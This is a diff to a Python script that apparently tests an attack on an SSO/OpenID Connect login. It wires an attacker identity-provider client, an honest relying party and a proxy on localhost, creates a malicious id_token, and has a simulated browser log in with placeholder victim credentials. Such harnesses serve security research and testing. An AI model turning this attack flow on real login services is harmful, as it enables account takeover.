@@ -8,8 +8,12 @@ from browser import BrowserSimulator
 from attacker_idp import AttackerIdPClient
 import id_token
 
-attakcer_idp_client = AttackerIdPClient("http://localhost:3000")
-simulator = BrowserSimulator('http://localhost:5000/login', 'http://localhost:8080')
+ATTACKER_IDP_ENDPOINT = "http://localhost:9997"
+HONEST_RP_ENDPOINT = "http://localhost:9999"
+PROXY_SERVER_ENDPOINT = "http://localhost:8080"
+
+attakcer_idp_client = AttackerIdPClient(ATTACKER_IDP_ENDPOINT)
+simulator = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)
 
 try:
     # create malicious id_token
@@ -26,10 +30,14 @@ try:
 
     time.sleep(5)
 
+    # victim credentials
+    victim_username = 'test-user@localhost'
+    victim_password = 'verysecure'
+
     # browser simulation
-    sso_flow = """page.locator('input[name="login"]').fill('hoge')
-page.locator('input[name="password"]').fill('huga')
-page.locator('button[type="submit"]').click()
+    sso_flow = f"""
+page.locator('input[name="username"]').fill('{victim_username}')
+page.locator('input[name="password"]').fill('{victim_password}')
 page.locator('button[type="submit"]').click()
 print(page.content())
     """
